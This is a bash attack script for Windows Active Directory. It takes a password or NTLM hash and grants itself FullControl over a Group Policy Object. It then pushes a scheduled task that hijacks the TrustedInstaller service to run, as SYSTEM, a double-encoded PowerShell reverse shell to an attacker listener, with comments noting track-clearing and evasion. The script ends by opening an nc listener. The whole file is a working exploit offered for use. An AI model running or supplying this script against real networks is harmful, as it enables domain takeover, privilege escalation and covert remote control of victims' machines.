#!/bin/bash

domain="$1"
user="$2"
password="$3"
gpo_guid="$4"
target_ip="$5"
listener_ip="$6"
listener_port="$7"

domain_prefix="$(echo $domain | cut -d'.' -f1)"
domain_suffix="$(echo $domain | cut -d'.' -f2)"
gpo_ldap_query="CN={$gpo_guid},CN=Policies,CN=System,DC=$domain_prefix,DC=$domain_suffix"

# Stage 2: basic PowerShell reverse shell, already running as NT AUTHORITY\SYSTEM because of how GPOs work, which first clears tracks after the first stage is executed and then sends the shell to the listener
payload_stage2=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"sc.exe config \"TrustedInstaller\" binpath= \"C:\\Windows\\servicing\\TrustedInstaller.exe\"; \$client = New-Object System.Net.Sockets.TCPClient(\"$listener_ip\",$listener_port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\"\").encode(\"utf-16-le\")).decode())")

# Stage 1: configures the TrustedInstaller service to first change its binary path to that of PowerShell and then uses it to spawn the Stage 2 payload as a child process of TI. This also has the desirable side-effect of making the actual reverse shell double-encoded, which is a good thing for evasion purposes.
payload_stage1=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"sc.exe config \"TrustedInstaller\" binpath= \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"; \$ti = Get-Service \"TrustedInstaller\"; \$ti.start(@(\"-ep\", \"bypass\", \"-WindowStyle\", \"Hidden\", \"-c\", \"Start-Process 'powershell.exe' \-ArgumentList '-ep bypass -WindowStyle Hidden -e $payload_stage2'\"))\"\"\").encode(\"utf-16-le\")).decode())")

if [ -d "backupgpo" ]
then
  rm -rf backupgpo
fi

if [ -n "$(echo $password | grep -Eo '[0-9a-fA-F]{32}')" ]
then
  # Pass the Hash
  impacket-dacledit -principal $user -target-dn="$gpo_ldap_query" -dc-ip $target_ip -hashes :$password $domain/$user -action write -rights FullControl

  gpowned -u $user -hashes :$password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"

  pygpoabuse -hashes :$password $domain/$user -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload_stage1
" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
else
  impacket-dacledit -principal $user -target-dn="$gpo_ldap_query" -dc-ip $target_ip $domain/$user:$password -action write -rights FullControl

  gpowned -u $user -p $password -d $domain -dc-ip $target_ip -gpcmachine -backup backupgpo -name "{$gpo_guid}"

  pygpoabuse $domain/$user:$password -gpo-id $gpo_guid -command "powershell -ep bypass -WindowStyle Hidden -e $payload_stage1
" -taskname "PT_RevShell" -description "this is a GPO test" -dc-ip $target_ip -v
fi

echo -e "\nBe patient: this reverse shell could take as long as 30 minutes to come back"
rlwrap nc -lvnp $listener_port
